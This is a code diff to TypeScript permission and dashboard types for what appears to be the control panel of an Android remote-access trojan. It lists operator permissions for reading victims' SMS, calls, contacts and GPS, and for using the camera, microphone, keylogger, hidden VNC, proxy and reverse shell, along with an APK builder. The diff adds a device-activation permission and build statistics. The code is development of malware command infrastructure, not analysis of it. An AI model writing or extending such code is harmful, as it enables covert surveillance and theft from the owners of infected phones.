@@ -55,6 +55,7 @@ export type Permission =
   | 'device:shell'
   | 'device:command'
   | 'device:delete'
+  | 'device:activation'
   | 'builder:access'
   | 'logs:view'
   | 'logs:clear'
@@ -69,18 +70,18 @@ export const ALL_PERMISSIONS: Permission[] = [
   'device:sms', 'device:calls', 'device:contacts', 'device:gps',
   'device:camera', 'device:mic', 'device:files', 'device:wifi',
   'device:clipboard', 'device:notifications', 'device:permissions',
-  'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:proxy', 'device:shell', 'device:command', 'device:delete',
+  'device:apps', 'device:fason', 'device:screen', 'device:hvnc', 'device:keylogger', 'device:proxy', 'device:shell', 'device:command', 'device:delete', 'device:activation',
   'builder:access', 'logs:view', 'logs:clear', 'users:manage',
   'settings:view', 'settings:edit', 'stats:view', 'files:download',
 ];
 
 export const DEFAULT_USER_PERMISSIONS: Permission[] = [
-  'dashboard:view', 'device:view',
-  'device:sms', 'device:calls', 'device:contacts', 'device:gps',
-  'device:camera', 'device:mic', 'device:files', 'device:wifi',
-  'device:clipboard', 'device:notifications', 'device:permissions',
-  'device:apps', 'device:fason', 'device:hvnc', 'device:keylogger', 'device:command',
-  'logs:view', 'settings:view',
+  'dashboard:view',
+  'device:view',
+  'device:fason',
+  'builder:access',
+  'settings:view',
+  'files:download',
 ];
 
 // Matches backend PERMISSION_GROUPS for UI categorization
@@ -111,6 +112,7 @@ export const PERMISSION_GROUPS = [
       { key: 'device:shell' as Permission, label: 'Обратная оболочка', description: 'Удалённое выполнение shell-команд' },
       { key: 'device:command' as Permission, label: 'Отправка команд', description: 'Отправка команд на устройство' },
       { key: 'device:delete' as Permission, label: 'Удаление устройства', description: 'Удаление устройства и его данных' },
+      { key: 'device:activation' as Permission, label: 'Разрешения устройств', description: 'Просмотр и подтверждение заявок на подключение устройств' },
     ],
   },
   {
@@ -152,7 +154,7 @@ export interface ClientDevice {
 
 export interface DashboardData {
   onlineClients: ClientDevice[]; offlineClients: ClientDevice[];
-  stats: { totalClients: number; onlineClients: number; offlineClients: number; totalLogs: number; todayLogs: number; totalUsers: number; totalAdmins: number; uptime: number; memoryUsage: number; };
+  stats: { totalClients: number; onlineClients: number; offlineClients: number; totalLogs: number; todayLogs: number; totalUsers: number; totalAdmins: number; uptime: number; memoryUsage: number; totalBuilds?: number; completedBuilds?: number; failedBuilds?: number; pendingActivations?: number; apkStorageBytes?: number; databaseBytes?: number; recentLogs?: Array<any>; };
 }
 
 export interface DeviceInfo {
